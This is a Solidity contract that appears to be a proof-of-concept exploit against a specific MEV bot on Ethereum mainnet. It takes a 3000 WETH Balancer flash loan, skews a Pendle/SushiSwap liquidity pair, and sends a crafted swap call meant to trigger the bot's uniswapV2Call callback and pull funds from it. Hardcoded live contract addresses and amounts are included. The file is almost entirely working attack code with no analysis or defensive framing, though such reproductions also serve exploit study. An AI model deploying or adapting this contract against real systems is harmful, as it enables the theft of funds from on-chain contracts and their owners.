// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;


import "./IERC20.sol";
import "./console.sol";
import "./IUniswapV2pair.sol";

interface IProtocolFeesCollector{
    function getFlashLoanFeePercentage() external view returns (uint256);
}

interface IPendleRouter{
    function swapExactOut(
        address tokenIn,
        address tokenOut,
        uint256 outTotalAmount,
        uint256 maxInTotalAmount,
        bytes32 marketFactoryId
    ) external payable returns (uint256 inTotalAmount);
}

interface IPendleYieldToken{

}

interface IPendleData{
    function isMarket(address _addr) external view returns (bool result);

    function getMarketFromKey(
        address xyt,
        address token,
        bytes32 marketFactoryId
    ) external view returns (address market);

    function curveShiftBlockDelta() external view returns (uint256);

    function protocolSwapFee() external view returns (uint256);

    function swapFee() external view returns (uint256);

    function xytTokens(
        bytes32 forgeId,
        address underlyingAsset,
        uint256 expiry
    ) external view returns (IPendleYieldToken xyt);

    function getPendleYieldTokens(
        bytes32 forgeId,
        address underlyingYieldToken,
        uint256 expiry
    ) external view returns (IPendleYieldToken ot, IPendleYieldToken xyt);
}

interface IPendleGenericMarket{
    struct PendingTransfer {
        uint256 amount;
        bool isOut;
    }

    function swapExactOut(
        address inToken,
        uint256 maxInAmount,
        address outToken,
        uint256 outAmount
    ) external returns (uint256 inAmount, PendingTransfer[2] memory transfers);
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IVault{
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract mev_bot{
    address public constant balancer_vault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;            //flashloan
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant ProtocolFeesCollector = 0xce88686553686DA562CE7Cea497CE749DA109f9F;     //flashloan fee
    address public constant pendle_slp = 0x37922C69b08BABcCEaE735A31235c81f1d1e8E43;
    address public constant pendle = 0x808507121B80c02388fAd14726482e061B8da827;
    address public constant yt_sushi_lp = 0x49c8aC20dE6409c7e0B8f9867cffD1481D8206c6;       //balanceof

    address public constant mev_bot_addr = 0x85e5C6cFFD260A7F153B1f34b36F6dBEBA3e279e;
    address public constant pendle_router = 0x1b6d3E5Da9004668E14Ca39d1553E9a46Fe842B3;         //swapExactOut

    address public constant pendle_ot_slp = 0xb124C4e18A282143D362a066736FD60d22393Ef4;     //swap

    address public constant pendle_data = 0xE8A6916576832AA5504092C1cCCC46E3bB9491d6;

    // function set_approve() public {
    //     IERC20(pendle).approve(pendle_router, type(uint).max);
    // }

    function flashloan_from_balancer() public{

        IFlashLoanRecipient recipient = IFlashLoanRecipient(address(this));
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(WETH);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 3000000000000000000000;

        bytes memory userData = "200";
        IVault(balancer_vault).flashLoan(recipient, tokens, amounts, userData);

        console.log("balancer flashloan has returned...");

        uint256 my_weth = IERC20(WETH).balanceOf(address(this));
        console.log("my weth is: ", my_weth);
    }


    function receiveFlashLoan(IERC20[] memory tokens, uint256[] memory amounts, uint256[] memory feeAmounts, bytes memory userData) external{
        uint256 WETH_amount = IERC20(WETH).balanceOf(address(this));
        console.log("1xxxxxx receive WETH from flashloan...", WETH_amount);

        uint256 flashloan_fee = IProtocolFeesCollector(ProtocolFeesCollector).getFlashLoanFeePercentage();
        console.log("flashloan_fee is: ", flashloan_fee);

        (uint256 r0, uint256 r1, ) = UniswapV2Pair(pendle_slp).getReserves();
        console.log("pendle slp reserve0 and reserve1: ", r0, r1);

        IERC20(WETH).transfer(pendle_slp, WETH_amount);
        uint256 amount0Out = 9143221416380545295906765;
        uint256 amount1Out = 0;
        bytes memory data0 = "";
        UniswapV2Pair(pendle_slp).swap(amount0Out, amount1Out, address(this), data0);

        (uint256 r00, uint256 r11, ) = UniswapV2Pair(pendle_slp).getReserves();
        console.log("2xxxxxx after swap pendle slp reserve0 and reserve1 remain: ", r00, r11);

        uint256 yt_slp = IERC20(yt_sushi_lp).balanceOf(mev_bot_addr);
        console.log("mev bot yt_slp balance: ", yt_slp);

        address tokenIn = pendle;
        address tokenOut = yt_sushi_lp;
        uint256 outTotalAmount = 163;
        uint256 maxInTotalAmount = 9143221416380545295906765;
        bytes32 marketFactoryId = 0x47656e6572696300000000000000000000000000000000000000000000000000;
        IPendleRouter(pendle_router).swapExactOut(tokenIn, tokenOut, outTotalAmount, maxInTotalAmount, marketFactoryId);
        console.log("3xxxxxx pendle router swapout...");

        IERC20(yt_sushi_lp).transfer(mev_bot_addr, 163);

        uint256 weth_bot = IERC20(WETH).balanceOf(mev_bot_addr);
        console.log("mev bot has weth...", weth_bot);

        bytes memory _data = "0x000000000000000000000000000000000000000000000079cab7ea8f2bb01430";
        UniswapV2Pair(pendle_ot_slp).swap(0, 200, mev_bot_addr, _data);             ////how to use mev bot's uniswapv2call
        console.log("4xxxxxx mev bot swap done...");
        


        (uint256 r000, uint256 r111, ) = UniswapV2Pair(pendle_slp).getReserves();
        console.log("5xxxxxx after swap pendle slp reserve0 and reserve1 remain: ", r000, r111);

        IERC20(pendle).transfer(pendle_slp, 9143221416380545295906765);


        uint256 amount0Out1 = 0;
        uint256 amount1Out1 = 3008182901858643848532;
        bytes memory data1 = "";
        UniswapV2Pair(pendle).swap(amount0Out1, amount1Out1, address(this), data1);

        IERC20(WETH).transfer(balancer_vault, 3000000000000000000000);
        console.log("transfer weth to vault....");
    }


    receive() payable external{}


}